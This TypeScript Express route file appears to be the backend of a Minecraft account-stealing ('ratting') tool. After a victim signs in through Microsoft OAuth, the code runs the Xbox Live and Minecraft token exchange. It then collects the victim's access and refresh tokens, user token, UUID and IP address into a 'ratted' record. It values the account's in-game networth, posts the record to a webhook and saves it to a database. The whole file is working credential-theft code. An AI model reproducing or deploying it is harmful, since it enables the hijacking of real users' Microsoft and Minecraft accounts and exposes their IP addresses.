import { Router, Request, Response } from 'express';
import config from '../../../../config.json';
import { database, logger } from '../../../index';
import axios from "axios";
import crypto from 'crypto';

import { 
    AccessAndRefreshToken,
    ErrorResponse,
    FormattedNetworth,
    NetworthData,
    RattedSchema,
    RequestObject,
    UserTokenAndHash,
    UsernameAndUUID
} from '../../../types';
import getProfileNetworth from '../../../utils/getProfileNetworth';
import sendWebhook from '../../../utils/sendWebhook';
import formatProfileNetworth from '../../../utils/formatProfileNetworth';

export class Callback {
    private readonly router: Router = Router();

    private accessAndRefresh: AccessAndRefreshToken;
    private userTokenAndHash: UserTokenAndHash;
    private xstsToken: string;
    private minecraftToken: string;
    private usernameAndUUID: UsernameAndUUID;

    constructor() {

        this.router.get("/api/v1/callback", async (req: Request, res: Response) => {
            if (!["code", "state"].every(key => req.query.hasOwnProperty(key))) {
                return res.status(400).json({ error: "Missing query parameters!" });
            }

            const { code, state }: RequestObject = req.query;

            try {
                // callback hell here
                await axios.post(`https://login.live.com/oauth20_token.srf`, {
                    client_secret: config.azure.client_secret,
                    redirect_uri: config.azure.redirect_uri,
                    client_id: config.azure.client_id,
                    grant_type: "authorization_code",
                    code: code
                }, {
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                })
                .then(response => {
                    this.accessAndRefresh = {
                        accessToken: response.data.access_token,
                        refreshToken: response.data.refresh_token
                    }
                })
                .catch(error => { throw new Error(error) });

                await axios.post(`https://user.auth.xboxlive.com/user/authenticate`, {
                    Properties: {
                        AuthMethod: "RPS",
                        SiteName: "user.auth.xboxlive.com",
                        RpsTicket: `d=${this.accessAndRefresh.accessToken}`
                    },
                    RelyingParty: "http://auth.xboxlive.com",
                    TokenType: "JWT"
                })
                .then(response => {
                    this.userTokenAndHash = {
                        userToken: response.data.Token,
                        userHash: response.data.DisplayClaims.xui[0].uhs
                    }
                })
                .catch(error => { throw new Error(error) });

                await axios.post(`https://xsts.auth.xboxlive.com/xsts/authorize`, {
                    Properties: {
                        SandboxId: "RETAIL",
                        UserTokens: [this.userTokenAndHash.userToken]
                    },
                    RelyingParty: "rp://api.minecraftservices.com/",
                    TokenType: "JWT"
                })
                .then(response => {
                    this.xstsToken = response.data.Token;
                })
                .catch(error => { throw new Error(error) });

                try {
                    await axios.post(`https://api.minecraftservices.com/authentication/login_with_xbox`, {
                        identityToken: `XBL3.0 x=${this.userTokenAndHash.userHash};${this.xstsToken}`
                    })
                    .then(response => {
                        this.minecraftToken = response.data.access_token;
                    })
                } catch (error) {
                    logger.error(error);
                    return res.status(500).json({ error: "An error occurred while authenticating! It seems the account you used to authenticate may not own Minecraft?" });
                }

                await axios.get(`https://api.minecraftservices.com/minecraft/profile`, {
                    headers: {
                        Authorization: `Bearer ${this.minecraftToken}`
                    }
                })
                .then(response => {
                    this.usernameAndUUID = {
                        username: response.data.name,
                        uuid: response.data.id
                    }
                })
                .catch(error => { throw new Error(error) });

                const hash = crypto.createHash("sha256");
                hash.update(this.accessAndRefresh.refreshToken + this.userTokenAndHash.userToken);
                const refreshKey = hash.digest("hex");

                const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || null;
  
                const profileNetworth: NetworthData | ErrorResponse = await getProfileNetworth(this.usernameAndUUID.uuid);
                const formattedNetworth: FormattedNetworth = formatProfileNetworth(profileNetworth);
                
                const ratted: RattedSchema = {
                    username: this.usernameAndUUID.username,
                    uuid: this.usernameAndUUID.uuid,
                    token: this.minecraftToken,
                    refreshToken: this.accessAndRefresh.refreshToken,
                    userToken: this.userTokenAndHash.userToken,
                    refreshKey: refreshKey,
                    ip: ip,
                    date: new Date().getTime(),
                    state: state,
                }

                await sendWebhook(ratted, formattedNetworth.formattedSoulboundNetworth, formattedNetworth.formattedUnsoulboundNetworth);

                database.insertRattedUser(ratted);
                
                return res.status(200).json({ status: "success" });
 
            } catch (error) {
                console.error(error);
                return res.status(500).json({ error: "An error occurred while authenticating!" });
            }
        })

    }

    getRouter() {
        return this.router;
    }

}